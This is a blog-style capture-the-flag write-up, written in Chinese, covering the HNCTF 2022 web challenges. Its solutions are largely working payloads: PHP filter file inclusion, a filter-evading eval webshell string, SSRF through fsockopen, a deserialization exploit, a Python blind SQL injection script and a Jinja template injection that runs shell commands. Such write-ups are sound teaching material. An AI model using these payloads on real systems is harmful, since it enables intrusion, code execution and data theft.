---
title: "2022 HNCTF Web Writeup"
date: 2022-10-03T16:20:40+08:00
lastmod: 2022-10-03T16:20:40+08:00
draft: true
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

<!--more-->

## Week1

### Interesting_http

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051900856.png)

### 2048

/2048.js

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051902942.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051902896.png)

### easy_html

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051903086.png)

### Interesting_include

```php
<?php
//WEB手要懂得搜索
//flag in ./flag.php

if(isset($_GET['filter'])){
    $file = $_GET['filter'];
    if(!preg_match("/flag/i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
}
```

```
http://43.143.7.97:28302/?filter=php://filter/read=convert.base64-encode/resource=flag.php
```

### easy_upload

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051905579.png)

### What is Web

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051906472.png)

### Challenge__rce

```php
<?php
error_reporting(0);
if (isset($_GET['hint'])) {
    highlight_file(__FILE__);
}
if (isset($_POST['rce'])) {
    $rce = $_POST['rce'];
    if (strlen($rce) <= 120) {
        if (is_string($rce)) {
            if (!preg_match("/[!@#%^&*:'\-<?>\"\/|`a-zA-Z~\\\\]/", $rce)) {
                eval($rce);
            } else {
                echo("Are you hack me?");
            }
        } else {
            echo "I want string!";
        }
    } else {
        echo "too long!";
    }
}
```

这题卡了好久, 过滤挺变态的

只能用 `$ _ () [] {} , . = + ;` 和数字 0-9 以及其它非 A-Z a-iz 的 Unicode 字符

开始用的是p牛文章里面的自增来构造 `_GET`, 结果超出了长度限制

然后根据题目的 hint `灵感来源于 ctfshow 七夕杯的 shellme_revenge`, 那题用的是 `NAN INF` 两个常量, 不过需要 `/` 运算符参与

想了好久... 再看文章的时候发现评论区底下有人用 chr 来构造 webshell

因为之前构造的是 `_GET`, 字母顺序是 E G T, 这就导致最后拼接起来很麻烦

但是 `chr` 的字母顺序就是 c h r, 可以通过 `Array` 中的 a 自增到 c 和 h

而且最关键的是字母 r 也在 `Array` 里, 可以直接取, 不需要自增, 这样就省了一大堆代码

最终 payload 如下

```php
$_=([].¥){3};$_++;$_.=++$_;$_++;$_++;$_++; $_++;$_++;$_.=([].¥){2};$_=_.$_(71).$_(69).$_(84);($$_{0})($$_{1});
```

长度为 112 字符

里面用到了一点 php7 的性质, 例如 `($a){1}` 和 `($a)($b)`, 然后又通过 `++$a` 和 `$a++` 的执行顺序差异进一步缩短长度

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210061511373.png)

## Week2

### easy_include

```php
<?php
//WEB手要懂得搜索

if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=/i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
}
```

nginx 日志包含

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051910358.png)

### ez_ssrf

```php
<?php

highlight_file(__FILE__);
error_reporting(0);

$data=base64_decode($_GET['data']);
$host=$_GET['host'];
$port=$_GET['port'];

$fp=fsockopen($host,intval($port),$error,$errstr,30);
if(!$fp) {
    die();
}
else {
    fwrite($fp,$data);
    while(!feof($data))
    {
        echo fgets($fp,128);
    }
    fclose($fp);
}
```

fsockopen 发送原始 tcp 数据包

flag.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051911698.png)

手写一个 http 数据包

```
GET /flag.php HTTP/1.1
Host: 127.0.0.1
Connection: close

```

```
index.php?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo%3d
```

请求的时候会卡很久才出结果, 不知道什么原因...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051914844.png)

### Canyource

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['code'])&&!preg_match('/url|show|high|na|info|dec|oct|pi|log|data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['code'])){
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);}
else
    die('nonono');}
else
    echo('please input code');
?>
```

这个正则一看就是无参数 rce

```
http://43.143.7.97:28972/?code=readfile(next(array_reverse(scandir(getcwd()))));
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051916825.png)


### easy_unser

```php
<?php 
    include 'f14g.php';
    error_reporting(0);

    highlight_file(__FILE__);

    class body{

    private $want,$todonothing = "i can't get you want,But you can tell me before I wake up and change my mind";

    public function  __construct($want){
        $About_me = "When the object is created,I will be called";
        if($want !== " ") $this->want = $want;
        else $this->want = $this->todonothing;
    }
    function __wakeup(){
        $About_me = "When the object is unserialized,I will be called";
        $but = "I can CHANGE you";
        $this-> want = $but;
        echo "C1ybaby!";
        
    }
    function __destruct(){
        $About_me = "I'm the final function,when the object is destroyed,I will be called";
        echo "So,let me see if you can get what you want\n";
        if($this->todonothing === $this->want)
            die("鲍勃,别傻愣着!\n");
        if($this->want == "I can CHANGE you")
            die("You are not you....");
        if($this->want == "f14g.php" OR is_file($this->want)){
            die("You want my heart?No way!\n");
        }else{
            echo "You got it!";
            highlight_file($this->want);
            }
    }
}

    class unserializeorder{
        public $CORE = "人类最大的敌人,就是无序. Yahi param vaastavikta hai!<BR>";
        function __sleep(){
            $About_me = "When the object is serialized,I will be called";
            echo "We Come To HNCTF,Enjoy the ser14l1zti0n <BR>";
        }
        function __toString(){
            $About_me = "When the object is used as a string,I will be called";
            return $this->CORE;
        }
    }
    
    $obj = new unserializeorder();
    echo $obj;
    $obj = serialize($obj);
    

    if (isset($_GET['ywant']))
    {
        $ywant = @unserialize(@$_GET['ywant']);
        echo $ywant;
    }
?>
```

乱七八糟的...

简单反序列化

用 unserializeorder 可以绕过 `is_file` 的检测

```php
<?php 

class body{

    private $want;

    function __construct($want){
        $this->want = $want;
    }
}

class unserializeorder{
    public $CORE = "php://filter/read=convert.base64-encode/resource=f14g.php";
}

$a = new body(new unserializeorder());

echo urlencode(serialize($a));
?>
```

```
http://43.143.7.97:28005/?ywant=O%3A4%3A%22body%22%3A2%3A%7Bs%3A10%3A%22%00body%00want%22%3BO%3A16%3A%22unserializeorder%22%3A1%3A%7Bs%3A4%3A%22CORE%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Df14g.php%22%3B%7D%7D
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051918643.png)

### easy_sql

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210051948852.png)

过滤了 and information_schema 空格

information_schema 可以用 InnoDB 的表代替, 刚好数据库用户是 root, 版本号也满足

注释也被过滤了, 需要用 or 构造一下

然后就是利用子查询进行无列名盲注, 因为 InnoDB 的表查不了列名

```python
import requests

url = 'http://43.143.7.97:28635/index.php'

flag = ''

for i in range(9999):
    for s in range(32,128):
        #sql = "123'or(if(ascii(substr((select/**/group_concat(database_name)/**/from/**/mysql.innodb_table_stats),{},1))={},1,0))or'1'='11".format(i,s)
        #sql = "123'or(if(ascii(substr((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name='ctftraining'),{},1))={},1,0))or'1'='11".format(i,s)
        sql = "123'or(if(ascii(substr((select/**/group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)x),{},1))={},1,0))or'1'='11".format(i,s)
        res = requests.post(url,data={'id':sql})
        if 'error' in res.text:
            print('filtered !!!')
            exit()
        if 'handsome' in res.text:
            flag += chr(s)
            print(flag)
            break
```

### ez_SSTI

简单 ssti

```
http://43.143.7.97:28254/?name={{config.__class__.__init__.__globals__['os']['popen']('cat flag').read()}}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210052001015.png)